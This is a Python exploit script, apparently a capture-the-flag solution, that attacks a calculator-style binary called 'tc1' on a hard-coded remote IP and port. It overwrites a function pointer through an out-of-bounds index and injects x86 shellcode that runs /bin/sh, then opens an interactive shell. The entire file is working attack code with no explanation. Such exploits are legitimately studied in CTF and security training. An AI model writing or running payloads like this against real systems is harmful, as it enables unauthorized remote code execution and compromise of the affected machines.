#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'ByStudent'
from zio import *
target = "./tc1"
target = ("106.75.9.11", 20000)
def get_io(target):
   r_m = COLORED(RAW, "green")
   w_m = COLORED(RAW, "blue")
   io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
   return io
def pwn(io):
   buff_addr_old = 0x0804A0A0
   buff_addr = 0x0804A0C0
   shellcode = 'h/sh\x00h/bin\xb8\x0b\x00\x00\x00\x89\xe3\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xcd\x80'
   func_addr = 0x0804A030
   index = (buff_addr - func_addr)/4 + 1
   payload = ""
   payload += str(index)
   io.read_until("4. Divide\n")
   io.writeline(payload)
   payload = ""
   payload += "1 2".ljust(0x20, ' ')
   payload += l32(buff_addr+4)
   payload += shellcode
   #io.gdb
   io.writeline(payload)
   io.interact()
io = get_io(target)
pwn(io)
